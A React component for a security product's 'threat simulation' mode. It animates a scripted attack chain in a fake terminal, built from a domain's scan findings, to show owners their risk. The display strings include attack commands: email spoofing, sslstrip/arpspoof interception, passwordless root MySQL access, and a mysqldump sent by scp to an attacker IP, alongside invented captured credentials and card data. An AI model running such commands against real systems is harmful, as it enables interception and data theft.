import { useState, useRef, useEffect } from "react"

export default function HackerSimulation({ scanResult, userProfile }) {
  const [phase, setPhase] = useState("idle")
  const [lines, setLines] = useState([])
  const [stepIndex, setStepIndex] = useState(0)
  const [simData, setSimData] = useState(null)
  const terminalRef = useRef(null)
  const timers = useRef([])

  // Auto scroll terminal on every new line
  useEffect(() => {
    if (terminalRef.current) {
      terminalRef.current.scrollTop = terminalRef.current.scrollHeight
    }
  }, [lines])

  // Cleanup all timers on unmount
  useEffect(() => () => timers.current.forEach(clearTimeout), [])

  function addTimer(fn, ms) {
    const t = setTimeout(fn, ms)
    timers.current.push(t)
  }

  // ─── BUILD SIMULATION FROM SCAN FINDINGS ───────────────────
  function buildSimulation() {
    const domain = scanResult?.domain || "target.com"
    const findings = scanResult?.findings || []
    const critical = findings.filter(f => f.status === "critical")
    const hasDMARC = critical.some(f =>
      f.check?.toLowerCase().includes("dmarc"))
    const hasSSL = critical.some(f =>
      f.check?.toLowerCase().includes("ssl"))
    const hasPort = critical.some(f =>
      f.check?.toLowerCase().includes("port") ||
      f.check?.toLowerCase().includes("mysql") ||
      f.check?.toLowerCase().includes("3306"))
    const hasSubdomain = findings.some(f =>
      f.check?.toLowerCase().includes("subdomain"))

    const steps = []
    let time = 2

    // Step 1 — Always: Recon
    steps.push({
      ts: `00:00:0${time}`,
      cmd: `nmap -sV --script vuln ${domain}`,
      out: [
        `Starting Nmap 7.94 scan against ${domain}`,
        `Host is up (0.043s latency)`,
        `Scanning ${domain} [1000 ports]`,
      ],
      alert: null,
      commentary: "Attacker maps the target infrastructure silently",
      severity: "probing"
    })
    time += 4

    // Step 2 — DNS enumeration
    steps.push({
      ts: `00:00:0${time}`,
      cmd: `subfinder -d ${domain} -silent | httpx -silent`,
      out: hasSubdomain
        ? [
            `[INF] Enumerating subdomains for ${domain}`,
            `admin.${domain} [200] [Admin Panel]`,
            `staging.${domain} [200] [Development Server]`,
            `api.${domain} [200] [API Endpoint]`,
          ]
        : [
            `[INF] Enumerating subdomains for ${domain}`,
            `No exposed subdomains found`,
          ],
      alert: hasSubdomain
        ? `ADMIN PANEL EXPOSED: admin.${domain}` : null,
      commentary: hasSubdomain
        ? "Forgotten admin panel found — no authentication required"
        : "Subdomain scan clean",
      severity: hasSubdomain ? "success" : "probing"
    })
    time += 5

    // Step 3 — Email security check
    if (hasDMARC) {
      steps.push({
        ts: `00:00:${time}`,
        cmd: `dig TXT _dmarc.${domain} +short`,
        out: [
          `; <<>> DiG 9.18 <<>> TXT _dmarc.${domain}`,
          `; ANSWER SECTION:`,
          `(empty — no DMARC record exists)`,
        ],
        alert: `NO DMARC POLICY — EMAIL SPOOFING POSSIBLE`,
        commentary:
          "No DMARC means anyone can send email as owner@" + domain,
        severity: "critical"
      })
      time += 5

      // Step 4 — Spoof email
      steps.push({
        ts: `00:00:${time}`,
        cmd: `python3 spoof.py --from "billing@${domain}" \\
  --subject "URGENT: Invoice #4821 Due Today" \\
  --targets customers_${domain}.txt`,
        out: [
          `[*] Loading customer list...`,
          `[+] 847 targets loaded`,
          `[*] Sending spoofed emails...`,
          `[+] Email 1/847 delivered — rahul@customer.com`,
          `[+] Email 2/847 delivered — priya@customer.com`,
          `[+] Email 847/847 delivered`,
          `[SUCCESS] 847 fake invoices sent from billing@${domain}`,
        ],
        alert: `847 CUSTOMERS RECEIVED FAKE INVOICE FROM YOUR DOMAIN`,
        commentary:
          "Customers trust the email — it shows your real domain name",
        severity: "critical"
      })
      time += 6
    }

    // Step 5 — SSL interception
    if (hasSSL) {
      steps.push({
        ts: `00:00:${time}`,
        cmd: `sslstrip -l 8080 -w capture.log &
arpspoof -i eth0 -t 192.168.1.1 ${domain}`,
        out: [
          `[*] SSL stripping proxy started on port 8080`,
          `[*] ARP poisoning ${domain}...`,
          `[+] Intercepting traffic from ${domain}`,
          `[CAPTURED] POST /login — username: admin password: Sharma@2024`,
          `[CAPTURED] POST /checkout — card: 4532****8821 cvv: 342`,
        ],
        alert: `ADMIN CREDENTIALS + PAYMENT DATA CAPTURED`,
        commentary:
          "Expired SSL allows traffic interception — credentials stolen in plaintext",
        severity: "critical"
      })
      time += 6
    }

    // Step 6 — Database access
    if (hasPort) {
      steps.push({
        ts: `00:00:${time}`,
        cmd: `mysql -h ${domain} -P 3306 -u root -p''`,
        out: [
          `Welcome to the MySQL monitor.`,
          `mysql> SHOW DATABASES;`,
          `+--------------------+`,
          `| Database           |`,
          `+--------------------+`,
          `| customers          |`,
          `| orders             |`,
          `| payment_history    |`,
          `+--------------------+`,
          `mysql> SELECT COUNT(*) FROM customers;`,
          `+----------+`,
          `| COUNT(*) |`,
          `+----------+`,
          `|      847 |`,
          `+----------+`,
        ],
        alert: `FULL DATABASE ACCESS — NO CREDENTIALS REQUIRED`,
        commentary:
          "MySQL port exposed publicly — entire database accessible without login",
        severity: "critical"
      })
      time += 7

      // Step 7 — Exfiltrate
      steps.push({
        ts: `00:00:${time}`,
        cmd: `mysqldump -h ${domain} --all-databases > stolen.sql
scp stolen.sql attacker@185.220.101.47:/drops/`,
        out: [
          `[*] Dumping all databases...`,
          `[+] customers table — 847 rows exported`,
          `[+] orders table — 3,241 rows exported`,
          `[+] payment_history table — 2,108 rows exported`,
          `[SUCCESS] 6,196 total records exfiltrated`,
          `[*] Transferring to remote server...`,
          `[SUCCESS] Transfer complete — 47.3 MB uploaded`,
        ],
        alert: `6,196 RECORDS STOLEN — UPLOAD COMPLETE`,
        commentary:
          "All customer data now on attacker server in Eastern Europe",
        severity: "critical"
      })
      time += 4
    }

    const criticalCount = critical.length
    const damage =
      criticalCount >= 4 ? "₹18,50,000"
      : criticalCount >= 3 ? "₹12,40,000"
      : criticalCount >= 2 ? "₹8,75,000"
      : "₹4,20,000"

    const records = hasPort ? 6196 : hasDMARC ? 847 : 234

    return {
      domain,
      total_time: `${time} seconds`,
      damage,
      records,
      steps,
      stolen: [
        hasDMARC && "Customer emails",
        hasSSL && "Login credentials",
        hasSSL && "Payment card data",
        hasPort && "Full customer database",
        hasPort && "Order history",
        "Business reputation",
      ].filter(Boolean),
      final_message: `In under ${time} seconds, your entire customer base was compromised. ${hasDMARC ? "847 customers received fake invoices. " : ""}${hasPort ? `${records.toLocaleString()} records were stolen. ` : ""}${hasSSL ? "Admin credentials were captured. " : ""}Your business cannot recover customer trust after a breach of this scale.`,
      prevention: `Fix ${hasDMARC ? "DMARC" : ""}${hasDMARC && (hasSSL || hasPort) ? " + " : ""}${hasSSL ? "SSL Certificate" : ""}${hasSSL && hasPort ? " + " : ""}${hasPort ? "close Port 3306" : ""} — eliminates ${criticalCount >= 3 ? "this entire" : "the primary"} attack chain in under 25 minutes.`
    }
  }

  // ─── PLAY ANIMATION ────────────────────────────────────────
  function playSteps(steps) {
    let delay = 0

    steps.forEach((step, i) => {
      const stepDelay = i * 2800

      // Timestamp + command
      addTimer(() => {
        setStepIndex(i)
        setLines(prev => [...prev, {
          id: `ts-${i}`,
          type: "timestamp",
          text: `[${step.ts}]`
        }])
        addTimer(() => {
          // Handle multi-line commands
          step.cmd.split('\n').forEach((cmdLine, ci) => {
            addTimer(() => {
              setLines(prev => [...prev, {
                id: `cmd-${i}-${ci}`,
                type: "command",
                text: ci === 0 ? `$ ${cmdLine}` : `  ${cmdLine}`
              }])
            }, ci * 200)
          })
        }, 300)
      }, stepDelay)

      // Output lines
      addTimer(() => {
        step.out.forEach((line, li) => {
          addTimer(() => {
            setLines(prev => [...prev, {
              id: `out-${i}-${li}`,
              type: "output",
              text: `  ${line}`
            }])
          }, li * 120)
        })
      }, stepDelay + 900)

      // Alert line
      if (step.alert) {
        addTimer(() => {
          setLines(prev => [...prev, {
            id: `alert-${i}`,
            type: step.severity === "critical"
              ? "critical"
              : "success",
            text: `!! ${step.alert}`
          }])
        }, stepDelay + 900 + step.out.length * 120 + 200)
      }

      // Commentary
      addTimer(() => {
        setLines(prev => [...prev, {
          id: `com-${i}`,
          type: "commentary",
          text: `   ↳ ${step.commentary}`
        }, {
          id: `gap-${i}`,
          type: "gap",
          text: ""
        }])
      }, stepDelay + 900 + step.out.length * 120 + 500)
    })

    // Final breach line
    addTimer(() => {
      setLines(prev => [...prev, {
        id: "breach",
        type: "breach",
        text: "!! BREACH COMPLETE — ALL OBJECTIVES ACHIEVED"
      }])
      setPhase("complete")
    }, steps.length * 2800 + 600)
  }

  // ─── INITIATE ──────────────────────────────────────────────
  async function handleInitiate() {
    timers.current.forEach(clearTimeout)
    timers.current = []
    setLines([])
    setStepIndex(0)
    setSimData(null)
    setPhase("loading")

    try {
      // Build synchronously so the click always triggers visible UI.
      const sim = buildSimulation()
      setSimData(sim)
      setPhase("playing")

      // Opening lines
      setLines([
        {
          id: "init-1",
          type: "system",
          text: `[SECUREIQ THREAT SIMULATION ENGINE v2.0]`
        },
        {
          id: "init-2",
          type: "system",
          text: `[TARGET: ${sim.domain}]`
        },
        {
          id: "init-3",
          type: "system",
          text: `[MODE: OPPORTUNISTIC ATTACKER SIMULATION]`
        },
        { id: "init-4", type: "gap", text: "" },
      ])

      // Start playback shortly after the opening lines render.
      addTimer(() => playSteps(sim.steps), 200)
    } catch (e) {
      // If anything goes wrong, restore to a safe UI state.
      setPhase("idle")
      setLines([])
      setStepIndex(0)
      setSimData(null)
    }
  }

  function handleReset() {
    timers.current.forEach(clearTimeout)
    timers.current = []
    setPhase("idle")
    setLines([])
    setStepIndex(0)
    setSimData(null)
  }

  // ─── LINE COLORS ───────────────────────────────────────────
  const lineStyles = {
    system: {
      color: "#66473B",
      fontStyle: "italic",
      fontSize: "12px"
    },
    timestamp: {
      color: "#35211A",
      fontSize: "11px",
      marginTop: "4px"
    },
    command: {
      color: "#DC9F85",
      fontWeight: "600",
      fontSize: "13px"
    },
    output: {
      color: "#B6A596",
      fontSize: "13px"
    },
    critical: {
      color: "#EBDCC4",
      fontWeight: "700",
      fontSize: "13px",
      background: "rgba(220,159,133,0.12)",
      padding: "3px 6px",
      borderRadius: "2px",
      display: "block",
      marginTop: "4px"
    },
    success: {
      color: "#DC9F85",
      fontWeight: "600",
      fontSize: "13px",
      fontStyle: "italic"
    },
    commentary: {
      color: "#66473B",
      fontSize: "12px"
    },
    breach: {
      color: "#EBDCC4",
      fontWeight: "800",
      fontSize: "14px",
      letterSpacing: "0.05em",
      background: "rgba(220,159,133,0.08)",
      padding: "8px",
      display: "block",
      borderLeft: "2px solid #DC9F85",
      paddingLeft: "12px",
      marginTop: "8px"
    },
    gap: {
      height: "8px",
      display: "block"
    }
  }

  // ─── STATIC PREVIEW LINES ──────────────────────────────────
  const previewLines = [
    { id: "p1", type: "command",
      text: `$ nmap -sV ${scanResult?.domain || "target"}` },
    { id: "p2", type: "command",
      text: "$ enumerate --dns --headers --email" },
    ...(scanResult?.findings
      ?.filter(f => f.status === "critical")
      ?.slice(0, 3)
      ?.map((f, i) => ({
        id: `pf${i}`,
        type: "critical",
        text: `!! ${f.check?.toUpperCase()} DETECTED`
      })) || [
      { id: "pf0", type: "critical",
        text: "!! SSL CERTIFICATE EXPIRED DETECTED" },
      { id: "pf1", type: "critical",
        text: "!! NO DMARC POLICY DETECTED" },
    ])
  ]

  // ─── RENDER ────────────────────────────────────────────────
  return (
    <div style={{
      borderTop: "1px solid #35211A",
      paddingTop: "32px",
      marginBottom: "40px"
    }}>

      {/* Section header */}
      <p style={{
        fontFamily: "'General Sans', sans-serif",
        fontSize: "11px",
        fontWeight: "600",
        letterSpacing: "0.12em",
        textTransform: "uppercase",
        color: "#DC9F85",
        marginBottom: "20px"
      }}>
        — THREAT SIMULATION MODE
      </p>

      {/* Progress bar when playing */}
      {phase === "playing" && simData && (
        <div style={{ marginBottom: "12px" }}>
          <div style={{
            display: "flex",
            justifyContent: "space-between",
            marginBottom: "5px"
          }}>
            <span style={{
              fontFamily: "'General Sans', sans-serif",
              fontSize: "10px",
              fontWeight: "600",
              letterSpacing: "0.1em",
              textTransform: "uppercase",
              color: "#35211A"
            }}>
              ATTACK PROGRESS
            </span>
            <span style={{
              fontFamily: "monospace",
              fontSize: "10px",
              color: "#DC9F85"
            }}>
              STEP {stepIndex + 1} /
              {simData.steps.length}
            </span>
          </div>
          <div style={{
            height: "1px",
            background: "#35211A",
            overflow: "hidden"
          }}>
            <div style={{
              height: "100%",
              background: "#DC9F85",
              width: `${((stepIndex + 1) /
                simData.steps.length) * 100}%`,
              transition: "width 600ms ease"
            }} />
          </div>
        </div>
      )}

      {/* Terminal window */}
      <div style={{
        border: "1px solid #35211A",
        borderRadius: "4px",
        overflow: "hidden",
        marginBottom: "20px"
      }}>

        {/* Mac-style header */}
        <div style={{
          background: "#141414",
          borderBottom: "1px solid #35211A",
          padding: "10px 16px",
          display: "flex",
          alignItems: "center",
          justifyContent: "space-between"
        }}>
          <div style={{ display: "flex", gap: "6px" }}>
            {[0, 1, 2].map(i => (
              <div key={i} style={{
                width: "10px",
                height: "10px",
                borderRadius: "50%",
                background: "#35211A"
              }} />
            ))}
          </div>
          <span style={{
            fontFamily: "monospace",
            fontSize: "11px",
            color: "#66473B",
            letterSpacing: "0.08em",
            textTransform: "uppercase"
          }}>
            ROOT@ATTACKER — BASH
          </span>
          <div style={{ width: "52px" }} />
        </div>

        {/* Terminal body */}
        <div
          ref={terminalRef}
          style={{
            background: "#0D0D0D",
            padding: "20px 24px",
            minHeight: "200px",
            maxHeight: "400px",
            overflowY: "auto",
            fontFamily: "monospace",
            lineHeight: "1.75"
          }}
        >

          {/* IDLE — static preview */}
          {phase === "idle" && previewLines.map(line => (
            <div key={line.id}
              style={lineStyles[line.type] || {}}>
              {line.text}
            </div>
          ))}

          {/* IDLE cursor */}
          {phase === "idle" && (
            <span style={{
              display: "inline-flex",
              alignItems: "center",
              gap: "6px",
              marginTop: "4px"
            }}>
              <span style={{ color: "#DC9F85" }}>$</span>
              <span style={{
                display: "inline-block",
                width: "8px",
                height: "15px",
                background: "#DC9F85",
                animation: "cur 1s step-end infinite",
                verticalAlign: "middle"
              }} />
            </span>
          )}

          {/* LOADING */}
          {phase === "loading" && (
            <div>
              <div style={{ color: "#66473B",
                fontStyle: "italic", fontSize: "12px" }}>
                [SECUREIQ THREAT SIMULATION ENGINE]
              </div>
              <div style={{ color: "#66473B",
                fontStyle: "italic", fontSize: "12px",
                marginTop: "4px" }}>
                [Analyzing scan findings...]
              </div>
              <div style={{
                display: "flex",
                alignItems: "center",
                gap: "8px",
                marginTop: "12px"
              }}>
                <span style={{
                  display: "inline-block",
                  width: "8px",
                  height: "8px",
                  borderRadius: "50%",
                  background: "#DC9F85",
                  animation: "blink 0.8s ease infinite"
                }} />
                <span style={{ color: "#DC9F85",
                  fontSize: "12px" }}>
                  Building attack chain from
                  your vulnerabilities...
                </span>
              </div>
            </div>
          )}

          {/* PLAYING + COMPLETE — live lines */}
          {(phase === "playing" ||
            phase === "complete") &&
            lines.map(line => (
              <div
                key={line.id}
                style={{
                  ...lineStyles[line.type] || {},
                  animation: "appear 0.15s ease forwards"
                }}
              >
                {line.text}
              </div>
            ))}

          {/* Live cursor while playing */}
          {phase === "playing" && (
            <span style={{
              display: "inline-block",
              width: "8px",
              height: "15px",
              background: "#DC9F85",
              animation: "cur 1s step-end infinite",
              verticalAlign: "middle",
              marginTop: "6px"
            }} />
          )}
        </div>
      </div>

      {/* Breach summary — shows when complete */}
      {phase === "complete" && simData && (
        <div style={{
          border: "1px solid #66473B",
          borderRadius: "4px",
          padding: "24px",
          marginBottom: "20px",
          background: "rgba(220,159,133,0.03)",
          animation: "appear 0.4s ease forwards"
        }}>

          {/* Header */}
          <p style={{
            fontFamily: "'General Sans', sans-serif",
            fontSize: "11px",
            fontWeight: "700",
            letterSpacing: "0.15em",
            textTransform: "uppercase",
            color: "#DC9F85",
            paddingBottom: "16px",
            borderBottom: "1px solid #35211A",
            marginBottom: "20px"
          }}>
            !! BREACH COMPLETE
          </p>

          {/* Stats 2x2 grid */}
          <div style={{
            display: "grid",
            gridTemplateColumns: "1fr 1fr",
            gap: "1px",
            background: "#35211A",
            marginBottom: "20px"
          }}>
            {[
              { label: "TIME TO BREACH",
                value: simData.total_time },
              { label: "RECORDS STOLEN",
                value: simData.records
                  .toLocaleString() + " RECORDS" },
              { label: "FINANCIAL DAMAGE",
                value: simData.damage },
              { label: "DATA EXFILTRATED",
                value: simData.stolen.length + " TYPES" },
            ].map((s, i) => (
              <div key={i} style={{
                background: "#181818",
                padding: "16px"
              }}>
                <p style={{
                  fontFamily: "'General Sans', sans-serif",
                  fontSize: "9px",
                  fontWeight: "600",
                  letterSpacing: "0.12em",
                  textTransform: "uppercase",
                  color: "#35211A",
                  marginBottom: "6px"
                }}>
                  {s.label}
                </p>
                <p style={{
                  fontFamily:
                    "'Clash Grotesk', sans-serif",
                  fontSize: "20px",
                  fontWeight: "700",
                  color: "#DC9F85",
                  textTransform: "uppercase",
                  letterSpacing: "-0.01em"
                }}>
                  {s.value}
                </p>
              </div>
            ))}
          </div>

          {/* Stolen data tags */}
          <div style={{ marginBottom: "20px" }}>
            <p style={{
              fontFamily: "'General Sans', sans-serif",
              fontSize: "9px",
              fontWeight: "600",
              letterSpacing: "0.12em",
              textTransform: "uppercase",
              color: "#35211A",
              marginBottom: "8px"
            }}>
              DATA EXFILTRATED —
            </p>
            <div style={{
              display: "flex",
              flexWrap: "wrap",
              gap: "6px"
            }}>
              {simData.stolen.map((item, i) => (
                <span key={i} style={{
                  border: "1px solid #66473B",
                  borderRadius: "4px",
                  padding: "3px 10px",
                  fontFamily: "'General Sans', sans-serif",
                  fontSize: "11px",
                  fontWeight: "500",
                  letterSpacing: "0.06em",
                  textTransform: "uppercase",
                  color: "#B6A596"
                }}>
                  {item}
                </span>
              ))}
            </div>
          </div>

          {/* Final message */}
          <p style={{
            fontFamily: "'General Sans', sans-serif",
            fontSize: "14px",
            fontWeight: "300",
            color: "#B6A596",
            lineHeight: "1.7",
            paddingBottom: "20px",
            borderBottom: "1px solid #35211A",
            marginBottom: "20px"
          }}>
            {simData.final_message}
          </p>

          {/* Prevention */}
          <div style={{
            borderLeft: "2px solid #B6A596",
            paddingLeft: "16px",
            marginBottom: "20px"
          }}>
            <p style={{
              fontFamily: "'General Sans', sans-serif",
              fontSize: "9px",
              fontWeight: "700",
              letterSpacing: "0.12em",
              textTransform: "uppercase",
              color: "#B6A596",
              marginBottom: "6px"
            }}>
              HOW TO PREVENT THIS —
            </p>
            <p style={{
              fontFamily: "'General Sans', sans-serif",
              fontSize: "13px",
              fontWeight: "400",
              color: "#EBDCC4",
              lineHeight: "1.6"
            }}>
              {simData.prevention}
            </p>
          </div>

          {/* Run again */}
          <button
            onClick={handleReset}
            style={{
              background: "transparent",
              border: "1px solid #35211A",
              borderRadius: "4px",
              padding: "10px 24px",
              color: "#66473B",
              fontFamily: "'General Sans', sans-serif",
              fontSize: "11px",
              fontWeight: "600",
              letterSpacing: "0.1em",
              textTransform: "uppercase",
              cursor: "pointer"
            }}
            onMouseEnter={e => {
              e.currentTarget.style.borderColor = "#DC9F85"
              e.currentTarget.style.color = "#DC9F85"
            }}
            onMouseLeave={e => {
              e.currentTarget.style.borderColor = "#35211A"
              e.currentTarget.style.color = "#66473B"
            }}
          >
            — RUN AGAIN
          </button>
        </div>
      )}

      {/* Main action button */}
      {(phase === "idle" || phase === "loading") && (
        <button
          onClick={phase === "idle" ? handleInitiate : undefined}
          disabled={phase === "loading"}
          style={{
            background: phase === "loading"
              ? "transparent" : "#DC9F85",
            border: phase === "loading"
              ? "1px solid #66473B" : "none",
            borderRadius: "4px",
            padding: "14px 32px",
            color: phase === "loading"
              ? "#66473B" : "#181818",
            fontFamily: "'General Sans', sans-serif",
            fontSize: "12px",
            fontWeight: "700",
            letterSpacing: "0.1em",
            textTransform: "uppercase",
            cursor: phase === "loading"
              ? "not-allowed" : "pointer",
            display: "flex",
            alignItems: "center",
            gap: "10px",
            transition: "opacity 150ms"
          }}
          onMouseEnter={e => {
            if (phase === "idle")
              e.currentTarget.style.opacity = "0.85"
          }}
          onMouseLeave={e => {
            e.currentTarget.style.opacity = "1"
          }}
          type="button"
        >
          {phase === "loading" && (
            <span style={{
              display: "inline-block",
              width: "8px",
              height: "8px",
              borderRadius: "50%",
              background: "#DC9F85",
              animation: "blink 0.8s ease infinite"
            }} />
          )}
          {phase === "loading"
            ? "BUILDING SIMULATION —"
            : "INITIATE SIMULATION —"}
        </button>
      )}

      <style>{`
        @keyframes cur {
          0%,100% { opacity:1; }
          50% { opacity:0; }
        }
        @keyframes blink {
          0%,100% { opacity:1; transform:scale(1); }
          50% { opacity:0.4; transform:scale(0.8); }
        }
        @keyframes appear {
          from { opacity:0; transform:translateY(3px); }
          to { opacity:1; transform:translateY(0); }
        }
      `}</style>
    </div>
  )
}

